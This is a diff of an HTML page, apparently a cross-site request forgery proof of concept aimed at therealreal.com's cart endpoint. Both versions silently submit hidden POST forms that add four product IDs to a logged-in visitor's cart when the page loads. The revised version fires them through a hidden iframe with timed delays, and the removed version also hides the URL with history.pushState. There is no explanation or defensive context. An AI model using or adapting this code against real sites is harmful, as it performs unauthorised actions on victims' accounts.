@@ -1,51 +1,39 @@
 <html>
-<body>
+  <body>
 
-<script>
-const products = [
-  "49746363",
-  "49961588",
-  "49993188",
-  "49994478"
-];
+    <form action="https://www.therealreal.com/cart/items" method="POST">
+      <input type="hidden" name="id" value="49746363" />
+    </form>
 
-function addProduct(id, delay) {
-  setTimeout(() => {
+    <form action="https://www.therealreal.com/cart/items" method="POST">
+      <input type="hidden" name="id" value="49961588" />
+    </form>
 
-    const form = document.createElement("form");
-    form.method = "POST";
-    form.action = "https://www.therealreal.com/cart/items";
+    <form action="https://www.therealreal.com/cart/items" method="POST">
+      <input type="hidden" name="id" value="49993188" />
+    </form>
 
-    const fields = {
-      id: id,
-      _analytics_session_id: "1772452805893",
-      return_product_id: "",
-      protection_product_id: "",
-      query_id: "cc3ed214af22ae23fc8b727942010c9b"
-    };
+    <form action="https://www.therealreal.com/cart/items" method="POST">
+      <input type="hidden" name="id" value="49994478" />
+    </form>
 
-    for (const key in fields) {
-      const input = document.createElement("input");
-      input.type = "hidden";
-      input.name = key;
-      input.value = fields[key];
-      form.appendChild(input);
-    }
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
 
-    document.body.appendChild(form);
-    form.submit();
+    <script>
+      let i = 0;
+      const forms = document.forms;
 
-  }, delay);
-}
+      function submitNext() {
+        if (i < forms.length) {
+          forms[i].target = "hiddenFrame";
+          forms[i].submit();
+          i++;
+          setTimeout(submitNext, 800); // delay مهم
+        }
+      }
 
+      submitNext();
+    </script>
 
-products.forEach((id, index) => {
-  addProduct(id, index * 1500);
-});
-
-history.pushState('', '', '/');
-
-</script>
-
-</body>
+  </body>
 </html>
